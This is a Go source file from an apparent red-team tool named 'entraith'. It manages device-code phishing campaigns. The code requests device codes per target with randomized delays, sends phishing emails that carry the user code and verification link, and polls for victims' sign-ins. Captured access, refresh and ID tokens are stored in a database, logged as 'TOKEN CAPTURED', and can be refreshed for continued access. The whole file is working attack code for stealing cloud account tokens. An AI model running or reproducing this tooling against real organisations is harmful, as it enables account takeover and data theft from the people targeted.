package campaigns

import (
	"context"
	"fmt"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"sync"
	"time"

	"github.com/bl4cksku11/entraith/internal/mailer"
	"github.com/bl4cksku11/entraith/internal/modules/devicecode"
	"github.com/bl4cksku11/entraith/internal/store"
	"github.com/bl4cksku11/entraith/internal/targets"
)

type CampaignStatus int

const (
	StatusDraft CampaignStatus = iota
	StatusRunning
	StatusPaused
	StatusCompleted
	StatusAborted
)

func (s CampaignStatus) String() string {
	switch s {
	case StatusDraft:
		return "draft"
	case StatusRunning:
		return "running"
	case StatusPaused:
		return "paused"
	case StatusCompleted:
		return "completed"
	case StatusAborted:
		return "aborted"
	default:
		return "unknown"
	}
}

// Campaign is a single device code phishing campaign.
type Campaign struct {
	mu          sync.RWMutex
	ID          string         `json:"id"`
	Name        string         `json:"name"`
	Description string         `json:"description"`
	Status      CampaignStatus `json:"status"`
	CreatedAt   time.Time      `json:"created_at"`
	StartedAt   *time.Time     `json:"started_at,omitempty"`
	CompletedAt *time.Time     `json:"completed_at,omitempty"`

	Targets  *targets.Store     `json:"-"`
	Engine   *devicecode.Engine `json:"-"`
	CancelFn context.CancelFunc `json:"-"`

	ArtifactsPath string `json:"-"`
	ExportsPath   string `json:"-"`

	Results     []*devicecode.TokenResult
	ResultsByID map[string]*devicecode.TokenResult

	EmailResults []*mailer.EmailSendResult `json:"email_results,omitempty"`
}

type Manager struct {
	mu        sync.RWMutex
	campaigns map[string]*Campaign

	tenantID string
	clientID string
	scope    string
	pollSec  int

	artifactsPath string
	exportsPath   string
	db            *store.Store
}

func NewManager(tenantID, clientID, scope string, pollSec int, artifactsPath, exportsPath string, db *store.Store) *Manager {
	return &Manager{
		campaigns:     make(map[string]*Campaign),
		tenantID:      tenantID,
		clientID:      clientID,
		scope:         scope,
		pollSec:       pollSec,
		artifactsPath: artifactsPath,
		exportsPath:   exportsPath,
		db:            db,
	}
}

// Load reads persisted campaign state from the database. Call once at startup.
func (m *Manager) Load() error {
	rows, err := m.db.LoadCampaigns()
	if err != nil {
		return fmt.Errorf("loading campaigns: %w", err)
	}

	m.mu.Lock()
	defer m.mu.Unlock()

	for _, row := range rows {
		targetRows, err := m.db.LoadTargets(row.ID)
		if err != nil {
			return fmt.Errorf("loading targets for %s: %w", row.ID, err)
		}
		tokenRows, err := m.db.LoadTokens(row.ID)
		if err != nil {
			return fmt.Errorf("loading tokens for %s: %w", row.ID, err)
		}
		emailRows, err := m.db.LoadEmailResults(row.ID)
		if err != nil {
			return fmt.Errorf("loading email results for %s: %w", row.ID, err)
		}

		tstore := targets.NewStore()
		for _, t := range targetRows {
			tstore.Add(&targets.Target{
				ID:          t.ID,
				Email:       t.Email,
				DisplayName: t.DisplayName,
				Department:  t.Department,
				Region:      t.Region,
				Group:       t.Group,
				CustomField: t.CustomField,
				ImportedAt:  t.ImportedAt,
			})
		}

		results := make([]*devicecode.TokenResult, 0, len(tokenRows))
		byID := make(map[string]*devicecode.TokenResult, len(tokenRows))
		for _, t := range tokenRows {
			r := &devicecode.TokenResult{
				AccessToken:       t.AccessToken,
				RefreshToken:      t.RefreshToken,
				IDToken:           t.IDToken,
				TokenType:         t.TokenType,
				ExpiresIn:         t.ExpiresIn,
				Scope:             t.Scope,
				TargetID:          t.TargetID,
				TargetEmail:       t.TargetEmail,
				RedeemedAt:        t.RedeemedAt,
				UserPrincipalName: t.UPN,
			}
			results = append(results, r)
			byID[r.TargetID] = r
		}

		emailResults := make([]*mailer.EmailSendResult, 0, len(emailRows))
		for _, e := range emailRows {
			emailResults = append(emailResults, &mailer.EmailSendResult{
				TargetID:    e.TargetID,
				TargetEmail: e.TargetEmail,
				SentAt:      e.SentAt,
				Success:     e.Success,
				Error:       e.Error,
			})
		}

		status := CampaignStatus(row.Status)
		// Polling goroutines are gone after a restart.
		if status == StatusRunning {
			status = StatusAborted
		}

		c := &Campaign{
			ID:            row.ID,
			Name:          row.Name,
			Description:   row.Description,
			Status:        status,
			CreatedAt:     row.CreatedAt,
			StartedAt:     row.StartedAt,
			CompletedAt:   row.CompletedAt,
			ArtifactsPath: row.ArtifactsPath,
			ExportsPath:   row.ExportsPath,
			Targets:       tstore,
			Results:       results,
			ResultsByID:   byID,
			EmailResults:  emailResults,
		}
		m.campaigns[c.ID] = c
	}

	log.Printf("[store] loaded %d campaigns from database", len(rows))
	return nil
}

func (m *Manager) saveCampaign(c *Campaign) {
	c.mu.RLock()
	row := store.CampaignRow{
		ID:            c.ID,
		Name:          c.Name,
		Description:   c.Description,
		Status:        int(c.Status),
		CreatedAt:     c.CreatedAt,
		StartedAt:     c.StartedAt,
		CompletedAt:   c.CompletedAt,
		ArtifactsPath: c.ArtifactsPath,
		ExportsPath:   c.ExportsPath,
	}
	c.mu.RUnlock()
	if err := m.db.UpsertCampaign(row); err != nil {
		log.Printf("[store] failed to save campaign %s: %v", c.ID, err)
	}
}

func (m *Manager) NewCampaign(id, name, description string) *Campaign {
	c := &Campaign{
		ID:            id,
		Name:          name,
		Description:   description,
		Status:        StatusDraft,
		CreatedAt:     time.Now().UTC(),
		Targets:       targets.NewStore(),
		ArtifactsPath: filepath.Join(m.artifactsPath, id),
		ExportsPath:   filepath.Join(m.exportsPath, id),
		Results:       make([]*devicecode.TokenResult, 0),
		ResultsByID:   make(map[string]*devicecode.TokenResult),
		EmailResults:  make([]*mailer.EmailSendResult, 0),
	}
	m.mu.Lock()
	m.campaigns[id] = c
	m.mu.Unlock()
	m.saveCampaign(c)
	return c
}

func (m *Manager) GetCampaign(id string) (*Campaign, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	c, ok := m.campaigns[id]
	return c, ok
}

func (m *Manager) AllCampaigns() []*Campaign {
	m.mu.RLock()
	defer m.mu.RUnlock()
	out := make([]*Campaign, 0, len(m.campaigns))
	for _, c := range m.campaigns {
		out = append(out, c)
	}
	return out
}

// DeleteCampaign removes a campaign and all its data from the database and memory.
func (m *Manager) DeleteCampaign(id string) error {
	c, ok := m.GetCampaign(id)
	if !ok {
		return fmt.Errorf("campaign not found")
	}

	// Stop any active polling
	c.mu.Lock()
	if c.CancelFn != nil {
		c.CancelFn()
	}
	c.mu.Unlock()

	if err := m.db.DeleteCampaign(id); err != nil {
		return fmt.Errorf("deleting from database: %w", err)
	}

	m.mu.Lock()
	delete(m.campaigns, id)
	m.mu.Unlock()
	return nil
}

// Launch starts the device code flow for all loaded targets in the campaign.
func (m *Manager) Launch(campaignID string) error {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return fmt.Errorf("campaign %s not found", campaignID)
	}

	c.mu.Lock()
	if c.Status == StatusRunning {
		c.mu.Unlock()
		return fmt.Errorf("campaign already running")
	}
	c.mu.Unlock()

	engine := devicecode.NewEngine(m.tenantID, m.clientID, m.scope, m.pollSec)
	ctx, cancel := context.WithCancel(context.Background())

	c.mu.Lock()
	c.Engine = engine
	c.CancelFn = cancel
	now := time.Now().UTC()
	c.StartedAt = &now
	c.Status = StatusRunning
	c.mu.Unlock()

	m.saveCampaign(c)

	os.MkdirAll(c.ArtifactsPath, 0700)

	allTargets := c.Targets.All()
	if len(allTargets) == 0 {
		cancel()
		c.mu.Lock()
		c.Status = StatusDraft
		c.StartedAt = nil
		c.CancelFn = nil
		c.Engine = nil
		c.mu.Unlock()
		m.saveCampaign(c)
		return fmt.Errorf("no targets loaded")
	}

	codes := make([]*devicecode.DeviceCodeResponse, 0, len(allTargets))
	for _, t := range allTargets {
		dcr, err := engine.RequestDeviceCode(ctx, t.ID, t.Email)
		if err != nil {
			fmt.Printf("[WARN] Failed to get device code for %s: %v\n", t.Email, err)
			continue
		}
		codes = append(codes, dcr)

		// Persist device code
		m.db.UpsertDeviceCode(store.DeviceCodeRow{
			DeviceCode:      dcr.DeviceCode,
			CampaignID:      campaignID,
			TargetID:        dcr.TargetID,
			TargetEmail:     dcr.TargetEmail,
			UserCode:        dcr.UserCode,
			VerificationURI: dcr.VerificationURI,
			ExpiresIn:       dcr.ExpiresIn,
			IntervalSec:     dcr.Interval,
			Message:         dcr.Message,
			IssuedAt:        dcr.IssuedAt,
			ExpiresAt:       dcr.ExpiresAt,
		})

		time.Sleep(time.Duration(800+rand.Intn(2200)) * time.Millisecond)
	}

	for _, code := range codes {
		engine.StartPolling(ctx, code.TargetID)
	}

	go m.collectResults(ctx, c)

	return nil
}

func (m *Manager) collectResults(ctx context.Context, c *Campaign) {
	for {
		select {
		case <-ctx.Done():
			return
		case result, ok := <-c.Engine.Results:
			if !ok {
				return
			}
			c.mu.Lock()
			c.Results = append(c.Results, result)
			c.ResultsByID[result.TargetID] = result
			c.mu.Unlock()

			// Persist token to database
			if err := m.db.InsertToken(store.TokenRow{
				CampaignID:   c.ID,
				TargetID:     result.TargetID,
				TargetEmail:  result.TargetEmail,
				AccessToken:  result.AccessToken,
				RefreshToken: result.RefreshToken,
				IDToken:      result.IDToken,
				TokenType:    result.TokenType,
				ExpiresIn:    result.ExpiresIn,
				Scope:        result.Scope,
				UPN:          result.UserPrincipalName,
				RedeemedAt:   result.RedeemedAt,
			}); err != nil {
				log.Printf("[store] failed to save token for %s: %v", result.TargetEmail, err)
			}

			m.saveCampaign(c)

			fmt.Printf("[+] TOKEN CAPTURED: target=%s upn=%s redeemed_at=%s\n",
				result.TargetEmail,
				result.UserPrincipalName,
				result.RedeemedAt.Format(time.RFC3339),
			)
		}
	}
}

func (m *Manager) Stop(campaignID string) error {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return fmt.Errorf("campaign not found")
	}
	c.mu.Lock()
	if c.CancelFn != nil {
		c.CancelFn()
	}
	now := time.Now().UTC()
	c.CompletedAt = &now
	c.Status = StatusAborted
	c.mu.Unlock()
	m.saveCampaign(c)
	return nil
}

func (m *Manager) GetStatus(campaignID string) (map[string]interface{}, error) {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return nil, fmt.Errorf("campaign not found")
	}

	c.mu.RLock()
	defer c.mu.RUnlock()

	sessions := map[string]interface{}{}
	if c.Engine != nil {
		for id, snap := range c.Engine.AllSessions() {
			sessions[id] = snap
		}
	}

	return map[string]interface{}{
		"id":           c.ID,
		"name":         c.Name,
		"status":       c.Status.String(),
		"target_count": c.Targets.Count(),
		"token_count":  len(c.Results),
		"created_at":   c.CreatedAt,
		"started_at":   c.StartedAt,
		"completed_at": c.CompletedAt,
		"sessions":     sessions,
	}, nil
}

func (m *Manager) GetTokenByTargetID(campaignID, targetID string) (*devicecode.TokenResult, error) {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return nil, fmt.Errorf("campaign not found")
	}
	c.mu.RLock()
	t, ok := c.ResultsByID[targetID]
	c.mu.RUnlock()
	if ok {
		return t, nil
	}
	// Fall back to database (e.g. after server restart)
	row, err := m.db.LoadTokenByTargetID(campaignID, targetID)
	if err != nil {
		return nil, err
	}
	if row == nil {
		return nil, fmt.Errorf("no token for target %s", targetID)
	}
	return &devicecode.TokenResult{
		AccessToken:       row.AccessToken,
		RefreshToken:      row.RefreshToken,
		IDToken:           row.IDToken,
		TokenType:         row.TokenType,
		ExpiresIn:         row.ExpiresIn,
		Scope:             row.Scope,
		TargetID:          row.TargetID,
		TargetEmail:       row.TargetEmail,
		RedeemedAt:        row.RedeemedAt,
		UserPrincipalName: row.UPN,
	}, nil
}

// RefreshToken exchanges the stored refresh_token for new tokens and persists the result.
func (m *Manager) RefreshToken(campaignID, targetID string) (*devicecode.TokenResult, error) {
	existing, err := m.GetTokenByTargetID(campaignID, targetID)
	if err != nil {
		return nil, err
	}
	if existing.RefreshToken == "" {
		return nil, fmt.Errorf("no refresh token available for target %s", targetID)
	}

	refreshed, err := devicecode.RefreshAccessToken(context.Background(), m.tenantID, m.clientID, existing.RefreshToken, m.scope)
	if err != nil {
		return nil, err
	}

	refreshed.TargetID = existing.TargetID
	refreshed.TargetEmail = existing.TargetEmail
	refreshed.UserPrincipalName = existing.UserPrincipalName
	if refreshed.RefreshToken == "" {
		refreshed.RefreshToken = existing.RefreshToken
	}

	// Update in-memory cache
	c, ok := m.GetCampaign(campaignID)
	if ok {
		c.mu.Lock()
		c.ResultsByID[targetID] = refreshed
		for i, r := range c.Results {
			if r.TargetID == targetID {
				c.Results[i] = refreshed
				break
			}
		}
		c.mu.Unlock()
	}

	// Persist updated tokens
	if err := m.db.UpdateLatestToken(campaignID, targetID, refreshed.AccessToken, refreshed.RefreshToken, refreshed.RedeemedAt); err != nil {
		log.Printf("[store] failed to update token for %s: %v", targetID, err)
	}

	return refreshed, nil
}

func (m *Manager) GetTokens(campaignID string) ([]*devicecode.TokenResult, error) {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return nil, fmt.Errorf("campaign not found")
	}
	c.mu.RLock()
	defer c.mu.RUnlock()
	return c.Results, nil
}

// SendEmails dispatches phishing emails to all targets with active device code sessions.
func (m *Manager) SendEmails(campaignID string, profile *mailer.SenderProfile, tmpl *mailer.EmailTemplate) ([]*mailer.EmailSendResult, error) {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return nil, fmt.Errorf("campaign not found")
	}
	if c.Engine == nil {
		return nil, fmt.Errorf("campaign not launched — no device codes available yet")
	}

	sessions := c.Engine.AllSessions()
	if len(sessions) == 0 {
		return nil, fmt.Errorf("no active sessions to send emails to")
	}

	results := make([]*mailer.EmailSendResult, 0, len(sessions))
	for _, snap := range sessions {
		name := ""
		if t, ok := c.Targets.GetByID(snap.TargetID); ok {
			name = t.DisplayName
		}
		data := mailer.TemplateData{
			UserCode:    snap.UserCode,
			RealURL:     snap.VerificationURI,
			TargetEmail: snap.TargetEmail,
			TargetName:  name,
		}
		err := mailer.Send(profile, tmpl, data)
		res := &mailer.EmailSendResult{
			TargetID:    snap.TargetID,
			TargetEmail: snap.TargetEmail,
			SentAt:      time.Now().UTC(),
			Success:     err == nil,
		}
		if err != nil {
			res.Error = err.Error()
		}
		results = append(results, res)

		m.db.InsertEmailResult(store.EmailResultRow{
			CampaignID:  campaignID,
			TargetID:    res.TargetID,
			TargetEmail: res.TargetEmail,
			SentAt:      res.SentAt,
			Success:     res.Success,
			Error:       res.Error,
		})
	}

	c.mu.Lock()
	c.EmailResults = append(c.EmailResults, results...)
	c.mu.Unlock()
	m.saveCampaign(c)

	return results, nil
}

func (m *Manager) GetEmailResults(campaignID string) ([]*mailer.EmailSendResult, error) {
	c, ok := m.GetCampaign(campaignID)
	if !ok {
		return nil, fmt.Errorf("campaign not found")
	}
	c.mu.RLock()
	defer c.mu.RUnlock()
	return c.EmailResults, nil
}

// SaveTargetToDB persists a newly added target to the database.
func (m *Manager) SaveTargetToDB(campaignID string, t *targets.Target) {
	if err := m.db.UpsertTarget(store.TargetRow{
		ID:          t.ID,
		CampaignID:  campaignID,
		Email:       t.Email,
		DisplayName: t.DisplayName,
		Department:  t.Department,
		Region:      t.Region,
		Group:       t.Group,
		CustomField: t.CustomField,
		ImportedAt:  t.ImportedAt,
	}); err != nil {
		log.Printf("[store] failed to save target %s: %v", t.Email, err)
	}
}

// ExportCampaign returns the full evidence package for a campaign.
func (m *Manager) ExportCampaign(campaignID string) (*store.CampaignExport, error) {
	if _, ok := m.GetCampaign(campaignID); !ok {
		return nil, fmt.Errorf("campaign not found")
	}
	return m.db.ExportCampaign(campaignID)
}
